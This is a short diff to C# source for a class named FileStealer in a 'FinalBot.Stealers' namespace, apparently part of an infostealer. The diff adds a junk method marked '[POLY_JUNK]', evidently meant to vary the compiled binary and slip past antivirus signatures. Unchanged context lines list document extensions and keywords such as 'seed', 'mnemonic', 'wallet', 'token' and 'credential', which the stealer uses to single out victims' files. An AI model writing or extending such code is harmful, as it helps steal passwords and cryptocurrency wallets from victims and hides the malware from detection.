@@ -8,6 +8,12 @@ namespace FinalBot.Stealers
 {
     public class FileStealer
     {
+        // [POLY_JUNK]
+        private static void _vanguard_2faf0fa9() {
+            int val = 60306;
+            if (val > 50000) Console.WriteLine("Hash:" + 60306);
+        }
+
         private static readonly string[] Extensions = { ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".rtf", ".php", ".py", ".cpp" };
         private static readonly string[] Keywords = { "pass", "login", "seed", "mnemonic", "wallet", "secret", "account", "crypto", "token", "auth", "credential" };
 
